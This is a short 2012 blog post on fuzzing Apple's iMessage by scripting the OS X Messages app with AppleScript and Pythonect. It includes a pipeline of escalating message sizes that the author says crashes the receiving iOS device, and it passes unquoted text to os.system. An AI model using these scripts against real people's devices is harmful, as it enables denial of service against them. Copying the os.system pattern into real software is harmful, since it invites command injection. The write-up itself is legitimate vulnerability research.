---
layout: post
title: "Fuzzy iOS Messages!"
date: 2012-10-19 20:42:06
---

Awhile ago I came across a post about fuzzing with a new data flow language called Pythonect.  When I read about it I thought it sounded like a pretty nifty language so I decided to try using it to fuzz the iMessage interface in the iOS Messages app.

The first part of this task is to come up with a way to send messages to an iOS device using the iMessage service.  Luckily the new Messages app on OS X 10.8 has support for AppleScript and you can send messages through it.

~~~
#!/usr/bin/osascript

on run argv
    set theMessage to (item 1 of argv)

    tell application "Messages"
         send theMessage to buddy "BUDDY_NAME"
    end tell
end run
~~~

In this script we tell the Messages application to send a message that was given as an argument to the buddy `BUDDY_NAME`.  When you use it be sure to replace `BUDDY_NAME` with the correct buddy name you are using.  Also, I saved the script and named it `send_msg`.

From here it’s quite easy to use Pythonect to do some fuzzing.  For example, the following script will send groups of 4 and 8 A’s, B’s, C’s, and D’s.

~~~
['A', 'B', 'C', 'D'] -> [_ * n for n in [4, 8]] -> os.system("./send_msg " + _)
~~~

So what else can we do with Pythonect?  Well for starters you can increase the number of characters and messages sent effectively DoSing the device.  You could also mix and match characters to see what outcome that may arrive at.

I haven’t had much time to play with this but I’ve found that running the following command seems to crash the device.

~~~
['A', 'B', 'C', 'D', '*', '+', '\', '/'] -> [_ * n for n in [100, 200, 500, 1000, 2000, 5000, 10000, 20000, 50000, 100000, 200000, 500000, 1000000, 2000000, 5000000]] -> os.system("./send_msg " + _)
~~~

And, this one causes the actual name of the app to be displayed.

~~~
['*'] -> os.system("./send_msg " + _)
~~~

So there is clearly something going on here, definitely stay tuned for what lurks within!

